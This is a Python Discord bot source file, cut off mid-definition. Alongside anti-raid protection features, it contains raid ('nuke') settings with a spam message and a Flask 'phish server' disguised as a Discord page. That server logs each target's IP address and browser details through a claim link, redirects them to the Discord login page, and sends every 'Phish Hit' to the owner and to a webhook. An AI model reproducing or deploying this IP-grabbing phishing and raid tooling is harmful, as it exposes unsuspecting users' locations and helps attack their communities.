# language: Python 3.13  |  file: bot.py  |  runtime: discord.py 2.x
# deps: discord.py — pip install discord.py
#       flask      — pip install flask
#       aiohttp    — pip install aiohttp  (usually bundled with discord.py)

import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import secrets
import string
import os
import re
import time
import threading
from collections import defaultdict
from typing import Optional
from flask import Flask, request, jsonify, redirect
import aiohttp

# ── config ────────────────────────────────────────────────────
TOKEN              = os.environ.get("TOKEN")
VERIFY_ROLE_NAME   = "Verified"
LOG_CHANNEL_NAME   = "lh-antinuke-logs"
LOG_ROLE_NAME      = "LH Security"
PREMIUM_USER_ID    = 1224012443341160498

# ── webhook logging ───────────────────────────────────────────
# Set LOG_WEBHOOK_URL in Railway Variables to a Discord webhook URL.
# All alerts will post there AND DM the owner.
# Leave blank to DM-only (original behaviour).
LOG_WEBHOOK_URL = os.environ.get("LOG_WEBHOOK_URL", "")

# ── known antinuke bot IDs ────────────────────────────────────
ANTINUKE_IDS = {
    159985870458322944,
    155149108183695360,
    235088799074484224,
    395087306962165763,
    282859044593598464,
    429457053791158281,
    573030148151189514,
    496683369965781012,
    715202395568095232,
    489977906714509312,
    505527697351696395,
}

# ── nuke config ───────────────────────────────────────────────
nuke_config = {
    "channel_name": "hooked by lh clan",
    "message":      "lol ur server doesn't even have any good protection get a job",
    "channel_count": 12,
    "spam_count":    100,
}

# ══════════════════════════════════════════════════════════════
#  UPGRADED TOKEN STORE
#  each token = {
#    "uses_left": int | None,     None = unlimited
#    "expires_at": float | None,  None = never expires
#    "created_at": float,
#    "created_by": int,           user ID
#    "label": str,                optional name
#  }
# ══════════════════════════════════════════════════════════════
active_tokens: dict[str, dict] = {}

# ── premium access store ──────────────────────────────────────
premium_users: dict[int, float] = {
    PREMIUM_USER_ID: float("inf")
}

# ── antinuke state ────────────────────────────────────────────
antinuke_enabled:   dict[int, bool] = defaultdict(lambda: True)
antinuke_whitelist: dict[int, set]  = defaultdict(set)
action_log: dict[int, dict[int, list]] = defaultdict(lambda: defaultdict(list))

# ── snapshots ─────────────────────────────────────────────────
role_snapshots:    dict[int, dict[int, dict]] = defaultdict(dict)
channel_snapshots: dict[int, dict[int, dict]] = defaultdict(dict)
restore_cooldown:  dict[int, float]           = defaultdict(float)
RESTORE_COOLDOWN_SECS = 10

# ── audit watcher ─────────────────────────────────────────────
suspicious_log: dict[int, dict[int, dict]] = defaultdict(lambda: defaultdict(lambda: defaultdict(int)))
SUSPICIOUS_ALERT_AT = 2

THRESHOLDS = {
    "channel_delete": (3, 5),
    "channel_create": (3, 5),
    "role_delete":    (3, 5),
    "kick":           (3, 5),
    "ban":            (2, 5),
    "webhook_create": (2, 10),
    "role_update":    (3, 5),
}

# ── DM tunnel store ───────────────────────────────────────────
# {target_user_id: owner_user_id}  — lives in memory, one slot per target
dm_tunnels: dict[int, int] = {}

# ── intents ───────────────────────────────────────────────────
intents = discord.Intents.default()
intents.members         = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

DISCORD_TOKEN_REGEX = re.compile(
    r"[MNO][a-zA-Z0-9_-]{23,25}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27,38}"
)


# ══════════════════════════════════════════════════════════════
#  PHISH SERVER — Flask, runs on port 8080 alongside the bot
#  set PHISH_URL in Railway Variables to your service's domain
#  set PHISH_KEY in Railway Variables to protect the /logs route
# ══════════════════════════════════════════════════════════════

flask_app  = Flask(__name__)
phish_logs: dict[str, list] = {}   # {user_id: [{ip, ua, ts}]}


@flask_app.route("/claim/<user_id>")
def claim(user_id):
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    user_agent = request.headers.get("User-Agent", "unknown")
    ts         = time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime())

    phish_logs.setdefault(user_id, []).append({
        "ip":         ip,
        "user_agent": user_agent,
        "timestamp":  ts
    })

    asyncio.run_coroutine_threadsafe(
        _notify_phish_hit(user_id, ip, user_agent, ts),
        bot.loop
    )

    return redirect("https://discord.com/login", code=302)


@flask_app.route("/logs")
def logs_all():
    key = request.args.get("key", "")
    if key != os.environ.get("PHISH_KEY", "lhsecret"):
        return jsonify({"error": "unauthorized"}), 401
    return jsonify(phish_logs)


@flask_app.route("/logs/<user_id>")
def logs_user(user_id):
    key = request.args.get("key", "")
    if key != os.environ.get("PHISH_KEY", "lhsecret"):
        return jsonify({"error": "unauthorized"}), 401
    return jsonify(phish_logs.get(user_id, []))


@flask_app.route("/")
def index():
    return "<title>Discord</title><body style='background:#23272a'></body>", 200


async def _notify_phish_hit(user_id: str, ip: str, user_agent: str, ts: str):
    embed = discord.Embed(
        title="🎣 Phish Hit!",
        color=0x00ff00,
        timestamp=discord.utils.utcnow()
    )
    embed.add_field(name="Target ID",  value=f"`{user_id}`",          inline=False)
    embed.add_field(name="IP Address", value=f"`{ip}`",                inline=True)
    embed.add_field(name="Time",       value=ts,                       inline=True)
    embed.add_field(name="User Agent", value=f"`{user_agent[:200]}`",  inline=False)
    embed.set_footer(text="LH Phish System")
    await notify_owner(embed)


def _run_flask():
    flask_app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False)


# start Flask in background thread before bot connects
threading.Thread(target=_run_flask, daemon=True).start()


# ══════════════════════════════════════════════════════════════
#  TOKEN HELPERS — UPGRADED
# ══════════════════════════════════════════════════════════════

def _gen_token_str() -> str:
    alphabet = string.ascii_letters + string.digits
    return "LHT-" + "".join(secrets.choice(alphabet) for _ in range(24))

def create_token(
    created_by: int,
    uses: Optional[int] = None,
    duration_secs: Optional[float] = None,
    label: str = ""
) -> str:
    tok = _gen_token_str()
    active_tokens[tok] = {
        "uses_left":  uses,
        "expires_at": (time.time() + duration_secs) if duration_secs else None,
        "created_at": time.time(),
        "created_by": created_by,
        "label":      label,
    }
    return tok

def validate_token(tok: str) -> tuple[bool, str]:
    tok = tok.strip()
    data = active_tokens.get(tok)
    if not data:
        return False, "Token does not exist."
    if data["expires_at"] is not None and time.time() > data["expires_at"]:
        active_tokens.pop(tok, None)
        return False, "Token has expired."
    if data["uses_left"] is not None:
        if data["uses_left"] <= 0:
            active_tokens.pop(tok, None)
            return False, "Token has no uses remaining."
        data["uses_left"] -= 1
        if data["uses_left"] <= 0:
            active_tokens.pop(tok, None)
    return True, "ok"

def _peek_token(tok: str) -> tuple[bool, str]:
    """check validity WITHOUT consuming a use"""
    tok = tok.strip()
    data = active_tokens.get(tok)
    if not data:
        return False, "Token does not exist."
    if data["expires_at"] is not None and time.time() > data["expires_at"]:
        active_tokens.pop(tok, None)
        return False, "Token has expired."
    if data["uses_left"] is not None and data["uses_left"] <= 0:
        active_tokens.pop(tok, None)
        return False, "Token has no uses remaining."
    return True, "ok"

def consume_token(tok: str):
    tok = tok.strip()
    data = active_tokens.get(tok)
    if not data:
        return
    if data["uses_left"] is not None:
        data["uses_left"] -= 1
        if data["uses_left"] <= 0:
            active_tokens.pop(tok, None)

def token_info_str(tok: str, data: dict) -> str:
    label    = f" `{data['label']}`" if data["label"] else ""
    uses     = f"{data['uses_left']} uses left" if data["uses_left"] is not None else "unlimited uses"
    if data["expires_at"] is None:
        exp = "never expires"
    else:
        remaining = data["expires_at"] - time.time()
        if remaining <= 0:
            exp = "expired"
        else:
            d = int(remaining // 86400)
            h = int((remaining % 86400) // 3600)
            m = int((remaining % 3600) // 60)
            parts = []
            if d: parts.append(f"{d}d")
            if h: parts.append(f"{h}h")
            if m: parts.append(f"{m}m")
            exp = "expires in " + (" ".join(parts) if parts else "< 1m")
    return f"`{tok}`{label} — {uses}, {exp}"


# ══════════════════════════════════════════════════════════════
#  OTHER HELPERS
# ══════════════════════════════════════════════════════════════

def is_premium(user_id: int) -> bool:
    expiry = premium_users.get(user_id)
    if expiry is None: return False
    if expiry == float("inf"): return True
    if time.time() < expiry: return True
    premium_users.pop(user_id, None)
    return False

def premium_expiry_str(user_id: int) -> str:
    expiry = premium_users.get(user_id)
    if expiry is None: return "No access"
    if expiry == float("inf"): return "Permanent"
    remaining = expiry - time.time()
    if remaining <= 0: return "Expired"
    d = int(remaining // 86400); h = int((remaining % 86400) // 3600); m = int((remaining % 3600) // 60)
    parts = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m: parts.append(f"{m}m")
    return " ".join(parts) if parts else "< 1m"

def parse_duration(s: str) -> Optional[float]:
    s = s.strip().lower()
    if s == "permanent": return float("inf")
    units = {"d": 86400, "h": 3600, "m": 60, "s": 1}
    if s and s[-1] in units:
        try: return float(s[:-1]) * units[s[-1]]
        except ValueError: return None
    return None

async def notify_owner(embed: discord.Embed):
    # DM the owner
    try:
        owner = await bot.fetch_user(PREMIUM_USER_ID)
        await owner.send(embed=embed)
    except Exception:
        pass
    # also post to webhook if configured
    await _webhook_log(embed)

async def _webhook_log(embed: discord.Embed):
    """Post an embed to LOG_WEBHOOK_URL if set."""
    if not LOG_WEBHOOK_URL:
        return
    payload = {
        "embeds": [_embed_to_dict(embed)]
    }
    try:
        async with aiohttp.ClientSession() as session:
            await session.post(LOG_WEBHOOK_URL, json=payload)
    except Exception:
        pass

def _embed_to_dict(embed: discord.Embed) -> dict:
    d: dict = {}
    if embed.title:       d["title"]       = embed.title
    if embed.description: d["description"] = embed.description
    if embed.color:       d["color"]       = embed.color.value
    if embed.timestamp:   d["timestamp"]   = embed.timestamp.isoformat()
    if embed.footer.text: d["footer"]      = {"text": embed.footer.text, "icon_url": embed.footer.icon_url or discord.utils.MISSING}
    if embed.author.name: d["author"]      = {"name": embed.author.name, "icon_url": embed.author.icon_url or discord.utils.MISSING}
    if embed.thumbnail.url: d["thumbnail"] = {"url": embed.thumbnail.url}
    if embed.image.url:     d["image"]     = {"url": embed.image.url}
    if embed.fields:
        d["fields"] = [{"name": f.name, "value": f.value, "inline": f.inline} for f in embed.fields]
    # strip MISSING sentinel values
    for section in ("footer", "author"):
        if section in d and d[section].get("icon_url") is discord.utils.MISSING:
            d[section].pop("icon_url", None)
    return d

async def get_or_create_log_channel(guild: discord.Guild) -> Optional[discord.TextChannel]:
    security_role = discord.utils.get(guild.roles, name=LOG_ROLE_NAME)
    if not security_role:
        try:
            security_role = await guild.create_role(
                name=LOG_ROLE_NAME, color=discord.Color.red(), hoist=True, reason="LH AntiNuke"
            )
        except Exception:
            security_role = None

    log_ch = discord.utils.get(guild.text_channels, name=LOG_CHANNEL_NAME)
    if log_ch: return log_ch

    overwrites = {
        guild.default_role: discord.PermissionOverwrite(view_channel=False),
        guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, embed_links=True),
    }
    if security_role:
        overwrites[security_role] = discord.PermissionOverwrite(view_channel=True, send_messages=False, read_message_history=True)

    try:
        category = discord.utils.get(guild.categories, name="🔒 LH Security")
        if not category:
            cat_ow = {
                guild.default_role: discord.PermissionOverwrite(view_channel=False),
                guild.me: discord.PermissionOverwrite(view_channel=True),
            }
            if security_role: cat_ow[security_role] = discord.PermissionOverwrite(view_channel=True)
            category = await guild.create_category("🔒 LH Security", overwrites=cat_ow, reason="LH AntiNuke")

        return await guild.create_text_channel(
            LOG_CHANNEL_NAME, category=category, overwrites=overwrites,
            topic="LH AntiNuke event log. Restricted access only.", reason="LH AntiNuke"
        )
    except Exception:
        return None

async def log_antinuke_event(guild: discord.Guild, embed: discord.Embed):
    log_ch = await get_or_create_log_channel(guild)
    if log_ch:
        try: await log_ch.send(embed=embed)
        except Exception: pass
    await notify_owner(embed)

async def antinuke_punish(guild: discord.Guild, member: discord.Member, reason: str):
    try:
        await guild.ban(member, reason=f"[AntiNuke] {reason}", delete_message_days=0)
        action = "Banned"
    except Exception:
        try:
            await member.kick(reason=f"[AntiNuke] {reason}")
            action = "Kicked"
        except Exception:
            action = "Failed"
    embed = discord.Embed(title="🛡️ AntiNuke — Threat Neutralized", color=0xff0000, timestamp=discord.utils.utcnow())
    embed.add_field(name="Server", value=f"{guild.name} (`{guild.id}`)", inline=False)
    embed.add_field(name="User",   value=f"{member} (`{member.id}`)",    inline=False)
    embed.add_field(name="Action", value=action,                         inline=True)
    embed.add_field(name="Reason", value=reason,                         inline=False)
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.set_footer(text="LH AntiNuke System")
    await log_antinuke_event(guild, embed)

def check_threshold(guild_id: int, user_id: int, action: str) -> bool:
    max_actions, within_seconds = THRESHOLDS.get(action, (5, 10))
    now = time.time()
    log = action_log[guild_id][user_id]
    log.append((action, now))
    action_log[guild_id][user_id] = [(a, t) for a, t in log if now - t <= within_seconds]
    return sum(1 for a, t in action_log[guild_id][user_id] if a == action) >= max_actions

async def send_suspicious_alert(guild: discord.Guild, user: discord.Member, action: str, count: int):
    embed = discord.Embed(title="👁️ AntiNuke — Suspicious Activity", color=0xff9900, timestamp=discord.utils.utcnow())
    embed.add_field(name="Server", value=f"{guild.name} (`{guild.id}`)",       inline=False)
    embed.add_field(name="User",   value=f"{user} (`{user.id}`)",              inline=False)
    embed.add_field(name="Action", value=action.replace("_", " ").title(),     inline=True)
    embed.add_field(name="Count",  value=str(count),                           inline=True)
    embed.set_thumbnail(url=user.display_avatar.url)
    embed.set_footer(text="LH AntiNuke — Audit Watcher")
    log_ch = await get_or_create_log_channel(guild)
    if log_ch:
        try: await log_ch.send(embed=embed)
        except Exception: pass
    await notify_owner(embed)


# ══════════════════════════════════════════════════════════════
#  SNAPSHOT SYSTEM
# ══════════════════════════════════════════════════════════════

def snapshot_roles(guild: discord.Guild):
    role_snapshots[guild.id] = {}
    for role in guild.roles:
        if role.is_default(): continue
        role_snapshots[guild.id][role.id] = {
            "name": role.name, "color": role.color.value,
            "permissions": role.permissions.value,
            "hoist": role.hoist, "mentionable": role.mentionable, "position": role.position,
        }

def snapshot_channels(guild: discord.Guild):
    channel_snapshots[guild.id] = {}
    for ch in guild.channels:
        if not isinstance(ch, discord.TextChannel): continue
        overwrites = {}
        for target, ow in ch.overwrites.items():
            key = f"role:{target.id}" if isinstance(target, discord.Role) else f"member:{target.id}"
            allow, deny = ow.pair()
            overwrites[key] = {"allow": allow.value, "deny": deny.value}
        channel_snapshots[guild.id][ch.id] = {
            "name": ch.name, "topic": ch.topic or "", "position": ch.position,
            "category_id": ch.category_id, "overwrites": overwrites,
        }

async def restore_role(guild: discord.Guild, role_id: int):
    snap = role_snapshots[guild.id].get(role_id)
    if not snap or snap["name"] == LOG_ROLE_NAME: return
    try:
        new_role = await guild.create_role(
            name=snap["name"], color=discord.Color(snap["color"]),
            permissions=discord.Permissions(snap["permissions"]),
            hoist=snap["hoist"], mentionable=snap["mentionable"],
            reason="[AntiNuke] Role restored"
        )
        try: await new_role.edit(position=snap["position"])
        except Exception: pass
        embed = discord.Embed(title="🔄 AntiNuke — Role Restored", color=0x00aaff, timestamp=discord.utils.utcnow())
        embed.add_field(name="Server", value=guild.name,       inline=False)
        embed.add_field(name="Role",   value=snap["name"],     inline=True)
        embed.set_footer(text="LH AntiNuke — Role Restoration")
        await log_antinuke_event(guild, embed)
    except Exception as e:
        embed = discord.Embed(title="⚠️ Role Restore Failed", description=f"`{snap['name']}`: `{e}`", color=0xff9900, timestamp=discord.utils.utcnow())
        await log_antinuke_event(guild, embed)

async def restore_channel(guild: discord.Guild, channel_id: int):
    snap = channel_snapshots[guild.id].get(channel_id)
    if not snap or snap["name"] == LOG_CHANNEL_NAME: return
    try:
        overwrites = {}
        for key, val in snap["overwrites"].items():
            kind, oid = key.split(":")
            oid = int(oid)
            ow  = discord.PermissionOverwrite.from_pair(discord.Permissions(val["allow"]), discord.Permissions(val["deny"]))
            target = guild.get_role(oid) if kind == "role" else guild.get_member(oid)
            if target: overwrites[target] = ow
        category = guild.get_channel(snap["category_id"]) if snap["category_id"] else None
        new_ch = await guild.create_text_channel(
            name=snap["name"], topic=snap["topic"] or None,
            category=category, overwrites=overwrites, reason="[AntiNuke] Channel restored"
        )
        try: await new_ch.edit(position=snap["position"])
        except Exception: pass
        embed = discord.Embed(title="🔄 AntiNuke — Channel Restored", color=0x00aaff, timestamp=discord.utils.utcnow())
        embed.add_field(name="Server",  value=guild.name,     inline=False)
        embed.add_field(name="Channel", value=new_ch.mention, inline=True)
        embed.set_footer(text="LH AntiNuke — Channel Restoration")
        await log_antinuke_event(guild, embed)
    except Exception as e:
        embed = discord.Embed(title="⚠️ Channel Restore Failed", description=f"`#{snap['name']}`: `{e}`", color=0xff9900, timestamp=discord.utils.utcnow())
        await log_antinuke_event(guild, embed)


# ══════════════════════════════════════════════════════════════
#  DM TUNNEL — MODAL REPLY SYSTEM
# ══════════════════════════════════════════════════════════════

class TunnelReplyModal(discord.ui.Modal, title="💬 Reply"):
    reply_text = discord.ui.TextInput(
        label="Your Message",
        placeholder="Type your reply here...",
        required=True,
        max_length=2000,
        style=discord.TextStyle.paragraph
    )

    def __init__(self, target_id: int):
        super().__init__()
        self.target_id = target_id

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        owner_id = dm_tunnels.get(self.target_id)
        if owner_id is None:
            await interaction.followup.send("❌ This conversation has been closed.", ephemeral=True)
            return

        # forward reply to owner + webhook log
        embed = discord.Embed(
            title="📨 Tunnel Reply Received",
            description=self.reply_text.value,
            color=0x5865f2,
            timestamp=discord.utils.utcnow()
        )
        embed.set_author(
            name=str(interaction.user),
            icon_url=interaction.user.display_avatar.url
        )
        embed.set_footer(text=f"User ID: {interaction.user.id}")
        try:
            owner = await bot.fetch_user(owner_id)
            await owner.send(embed=embed)
        except Exception:
            pass
        await _webhook_log(embed)

        # confirm to target
        await interaction.followup.send(
            embed=discord.Embed(
                title="✅ Reply Sent",
                description="Your message has been delivered.",
                color=0x00ff00
            ),
            ephemeral=True
        )

    async def on_error(self, interaction: discord.Interaction, error: Exception):
        try:
            await interaction.followup.send("❌ Something went wrong. Try again.", ephemeral=True)
        except Exception:
            pass


class TunnelMessageView(discord.ui.View):
    def __init__(self, target_id: int):
        super().__init__(timeout=None)
        self.target_id = target_id

    @discord.ui.button(
        label="Reply",
        emoji="💬",
        style=discord.ButtonStyle.blurple,
        custom_id="tunnel_reply"
    )
    async def reply_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        # only the target can click their own reply button
        if interaction.user.id != self.target_id:
            await interaction.response.send_message("❌ This button isn't for you.", ephemeral=True)
            return
        # check tunnel still open
        if self.target_id not in dm_tunnels:
            await interaction.response.send_message("❌ This conversation has been closed.", ephemeral=True)
            return
        await interaction.response.send_modal(TunnelReplyModal(self.target_id))


# ── !dmt — open a tunnel DM ───────────────────────────────────
@bot.command(name="dmt")
async def dmt(ctx, user_id: str = None, *, message: str = None):
    try: await ctx.message.delete()
    except Exception: pass

    if ctx.author.id != PREMIUM_USER_ID and not is_premium(ctx.author.id):
        await ctx.send("❌ Premium required.", delete_after=5); return

    if not user_id or not message:
        await ctx.send("❌ Usage: `!dmt <userID> <message>`", delete_after=5); return

    try:
        target_id = int(user_id)
        target    = await bot.fetch_user(target_id)
    except (ValueError, discord.NotFound):
        await ctx.send("❌ User not found.", delete_after=5); return

    # register tunnel
    dm_tunnels[target_id] = ctx.author.id

    embed = discord.Embed(
        title="📬 New Message",
        description=message,
        color=0x5865f2,
        timestamp=discord.utils.utcnow()
    )
    embed.set_footer(text="Click Reply to respond • LH Messaging")

    view = TunnelMessageView(target_id)

    try:
        await target.send(embed=embed, view=view)
    except discord.Forbidden:
        dm_tunnels.pop(target_id, None)
        await ctx.send("❌ Cannot DM that user (DMs closed or blocked).", delete_after=5)
        return

    # confirm to sender
    confirm = discord.Embed(
        title="✅ Tunnel DM Sent",
        color=0x00ff00,
        timestamp=discord.utils.utcnow()
    )
    confirm.add_field(name="Target",  value=f"{target} (`{target_id}`)", inline=False)
    confirm.add_field(name="Message", value=message[:200],               inline=False)
    confirm.set_footer(text="Tunnel open — replies will appear in your DMs")
    try:
        await ctx.author.send(embed=confirm)
        await ctx.send("✅ Tunnel DM sent — check your DMs.", delete_after=5)
    except discord.Forbidden:
        await ctx.send(embed=confirm, delete_after=10)


# ── !dmtreply — owner sends a follow-up into the tunnel ───────
@bot.command(name="dmtreply")
async def dmt_reply(ctx, user_id: str = None, *, message: str = None):
    try: await ctx.message.delete()
    except Exception: pass

    if ctx.author.id != PREMIUM_USER_ID and not is_premium(ctx.author.id):
        await ctx.send("❌ Premium required.", delete_after=5); return

    if not user_id or not message:
        await ctx.send("❌ Usage: `!dmtreply <userID> <message>`", delete_after=5); return

    try:
        target_id = int(user_id)
        target    = await bot.fetch_user(target_id)
    except (ValueError, discord.NotFound):
        await ctx.send("❌ User not found.", delete_after=5); return

    if target_id not in dm_tunnels or dm_tunnels[target_id] != ctx.author.id:
        await ctx.send("❌ No open tunnel to that user (or it's not yours).", delete_after=5); return

    embed = discord.Embed(
        title="📬 New Message",
        description=message,
        color=0x5865f2,
        timestamp=discord.utils.utcnow()
    )
    embed.set_footer(text="Click Reply to respond • LH Messaging")

    view = TunnelMessageView(target_id)

    try:
        await target.send(embed=embed, view=view)
        await ctx.send("✅ Follow-up sent.", delete_after=5)
    except discord.Forbidden:
        await ctx.send("❌ Cannot DM that user.", delete_after=5)


# ── !dmtclose — close a tunnel ────────────────────────────────
@bot.command(name="dmtclose")
async def dmt_close(ctx, user_id: str = None):
    try: await ctx.message.delete()
    except Exception: pass

    if ctx.author.id != PREMIUM_USER_ID and not is_premium(ctx.author.id):
        await ctx.send("❌ Premium required.", delete_after=5); return

    if not user_id:
        await ctx.send("❌ Usage: `!dmtclose <userID>`", delete_after=5); return

    try:
        target_id = int(user_id)
    except ValueError:
        await ctx.send("❌ Invalid user ID.", delete_after=5); return

    if target_id not in dm_tunnels:
        await ctx.send("❌ No tunnel open for that user.", delete_after=5); return

    if dm_tunnels[target_id] != ctx.author.id and ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ That tunnel isn't yours.", delete_after=5); return

    dm_tunnels.pop(target_id, None)

    # notify target
    try:
        target = await bot.fetch_user(target_id)
        await target.send(
            embed=discord.Embed(
                title="🔒 Conversation Closed",
                description="This conversation has ended. The Reply button is no longer active.",
                color=0xff9900,
                timestamp=discord.utils.utcnow()
            )
        )
    except Exception:
        pass

    await ctx.send(f"✅ Tunnel to `{target_id}` closed.", delete_after=5)


# ── !dmtlist — list open tunnels ──────────────────────────────
@bot.command(name="dmtlist")
async def dmt_list(ctx):
    try: await ctx.message.delete()
    except Exception: pass

    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ Access Denied.", delete_after=5); return

    if not dm_tunnels:
        await ctx.send(
            embed=discord.Embed(title="📋 Active Tunnels", description="No tunnels open.", color=0x5865f2),
            delete_after=10
        )
        return

    embed = discord.Embed(
        title="📋 Active Tunnels",
        color=0x5865f2,
        timestamp=discord.utils.utcnow()
    )
    lines = []
    for target_id, owner_id in dm_tunnels.items():
        lines.append(f"Target: `{target_id}` → Owner: `{owner_id}`")
    embed.description = "\n".join(lines)
    embed.set_footer(text=f"Total: {len(dm_tunnels)} tunnels")
    try:
        await ctx.author.send(embed=embed)
        await ctx.send("📋 Tunnel list sent to your DMs.", delete_after=5)
    except discord.Forbidden:
        await ctx.send(embed=embed, delete_after=15)


# ══════════════════════════════════════════════════════════════
#  BOT EVENTS
# ══════════════════════════════════════════════════════════════

@bot.event
async def on_ready():
    for guild in bot.guilds:
        snapshot_roles(guild)
        snapshot_channels(guild)
    try:
        await bot.tree.sync()
        print(f"[LH] Synced slash commands")
    except Exception as e:
        print(f"[LH] Slash sync failed: {e}")
    print(f"[LH] {bot.user} online — {len(bot.guilds)} servers")

@bot.event
async def on_guild_join(guild: discord.Guild):
    snapshot_roles(guild)
    snapshot_channels(guild)
    antinuke_enabled[guild.id] = True

@bot.event
async def on_guild_role_delete(role: discord.Role):
    guild = role.guild
    if not antinuke_enabled.get(guild.id, True): return
    now = time.time()
    if now - restore_cooldown[guild.id] < RESTORE_COOLDOWN_SECS: return
    restore_cooldown[guild.id] = now
    asyncio.create_task(restore_role(guild, role.id))

    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
        user = entry.user
        if user.id in antinuke_whitelist[guild.id] or user.id == bot.user.id: return
        if check_threshold(guild.id, user.id, "role_delete"):
            member = guild.get_member(user.id)
            if member: await antinuke_punish(guild, member, "Mass role deletion detected")

@bot.event
async def on_guild_channel_delete(channel: discord.abc.GuildChannel):
    guild = channel.guild
    if not antinuke_enabled.get(guild.id, True): return

    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
        user = entry.user
        if user.id in antinuke_whitelist[guild.id] or user.id == bot.user.id: return
        if check_threshold(guild.id, user.id, "channel_delete"):
            member = guild.get_member(user.id)
            if member: await antinuke_punish(guild, member, "Mass channel deletion detected")

    now = time.time()
    if now - restore_cooldown[guild.id] >= RESTORE_COOLDOWN_SECS:
        restore_cooldown[guild.id] = now
        if isinstance(channel, discord.TextChannel):
            asyncio.create_task(restore_channel(guild, channel.id))

@bot.event
async def on_member_ban(guild: discord.Guild, user: discord.User):
    if not antinuke_enabled.get(guild.id, True): return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
        actor = entry.user
        if actor.id in antinuke_whitelist[guild.id] or actor.id == bot.user.id: return
        if check_threshold(guild.id, actor.id, "ban"):
            member = guild.get_member(actor.id)
            if member: await antinuke_punish(guild, member, "Mass ban detected")

@bot.event
async def on_member_remove(member: discord.Member):
    guild = member.guild
    if not antinuke_enabled.get(guild.id, True): return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
        if entry.target.id != member.id: continue
        actor = entry.user
        if actor.id in antinuke_whitelist[guild.id] or actor.id == bot.user.id: return
        if check_threshold(guild.id, actor.id, "kick"):
            kicker = guild.get_member(actor.id)
            if kicker: await antinuke_punish(guild, kicker, "Mass kick detected")

@bot.event
async def on_guild_role_update(before: discord.Role, after: discord.Role):
    guild = before.guild
    if not antinuke_enabled.get(guild.id, True): return
    danger = discord.Permissions(administrator=True) | discord.Permissions(manage_guild=True) | discord.Permissions(ban_members=True)
    if not (after.permissions.value & danger.value): return
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_update):
        actor = entry.user
        if actor.id in antinuke_whitelist[guild.id] or actor.id == bot.user.id: return
        if check_threshold(guild.id, actor.id, "role_update"):
            member = guild.get_member(actor.id)
            if member: await antinuke_punish(guild, member, "Dangerous role permission escalation")

@bot.event
async def on_audit_log_entry_create(entry: discord.AuditLogEntry):
    guild = entry.guild
    if not antinuke_enabled.get(guild.id, True): return
    actor = entry.user
    if not actor or actor.id == bot.user.id or actor.id in antinuke_whitelist[guild.id]: return

    action_map = {
        discord.AuditLogAction.channel_delete: "channel_delete",
        discord.AuditLogAction.channel_create: "channel_create",
        discord.AuditLogAction.role_delete:    "role_delete",
        discord.AuditLogAction.ban:            "ban",
        discord.AuditLogAction.kick:           "kick",
        discord.AuditLogAction.webhook_create: "webhook_create",
        discord.AuditLogAction.role_update:    "role_update",
    }
    action_key = action_map.get(entry.action)
    if not action_key: return

    suspicious_log[guild.id][actor.id][action_key] += 1
    count = suspicious_log[guild.id][actor.id][action_key]

    if count == SUSPICIOUS_ALERT_AT:
        member = guild.get_member(actor.id)
        if member:
            await send_suspicious_alert(guild, member, action_key, count)


# ══════════════════════════════════════════════════════════════
#  TOKEN SLASH COMMANDS
# ══════════════════════════════════════════════════════════════

token_group = app_commands.Group(name="token", description="Token management (owner only)")
bot.tree.add_command(token_group)

@token_group.command(name="create", description="Create a premium token (owner only)")
@app_commands.describe(
    uses="Number of uses (leave blank = unlimited)",
    duration="Duration e.g. 7d, 24h, 30m (leave blank = never expires)",
    label="Optional label for this token"
)
async def token_create(interaction: discord.Interaction, uses: Optional[int] = None, duration: Optional[str] = None, label: Optional[str] = None):
    if interaction.user.id != PREMIUM_USER_ID:
        await interaction.response.send_message("❌ Owner only.", ephemeral=True); return
    duration_secs = None
    if duration:
        duration_secs = parse_duration(duration)
        if duration_secs is None:
            await interaction.response.send_message("❌ Invalid duration. Use `7d`, `24h`, `30m`, `60s`.", ephemeral=True); return
        if duration_secs == float("inf"):
            duration_secs = None
    tok = create_token(created_by=interaction.user.id, uses=uses, duration_secs=duration_secs, label=label or "")
    info = token_info_str(tok, active_tokens[tok])
    embed = discord.Embed(title="🔑 Token Created", description=info, color=0xffd700, timestamp=discord.utils.utcnow())
    embed.set_footer(text="Share via DM — keep private")
    await interaction.response.send_message(embed=embed, ephemeral=True)

@token_group.command(name="list", description="List all active tokens (owner only)")
async def token_list(interaction: discord.Interaction):
    if interaction.user.id != PREMIUM_USER_ID:
        await interaction.response.send_message("❌ Owner only.", ephemeral=True); return
    if not active_tokens:
        await interaction.response.send_message(embed=discord.Embed(title="🔑 Active Tokens", description="No tokens.", color=0xffd700), ephemeral=True); return
    embed = discord.Embed(title="🔑 Active Tokens", color=0xffd700, timestamp=discord.utils.utcnow())
    for tok, data in list(active_tokens.items()):
        embed.add_field(name="​", value=token_info_str(tok, data), inline=False)
    embed.set_footer(text=f"Total: {len(active_tokens)}")
    await interaction.response.send_message(embed=embed, ephemeral=True)

@token_group.command(name="revoke", description="Revoke a token (owner only)")
@app_commands.describe(token="Token string to revoke")
async def token_revoke(interaction: discord.Interaction, token: str):
    if interaction.user.id != PREMIUM_USER_ID:
        await interaction.response.send_message("❌ Owner only.", ephemeral=True); return
    tok = token.strip()
    if tok not in active_tokens:
        await interaction.response.send_message("❌ Token not found.", ephemeral=True); return
    active_tokens.pop(tok)
    await interaction.response.send_message(f"✅ Token `{tok}` revoked.", ephemeral=True)

@token_group.command(name="info", description="Check info on a token (owner only)")
@app_commands.describe(token="Token string to inspect")
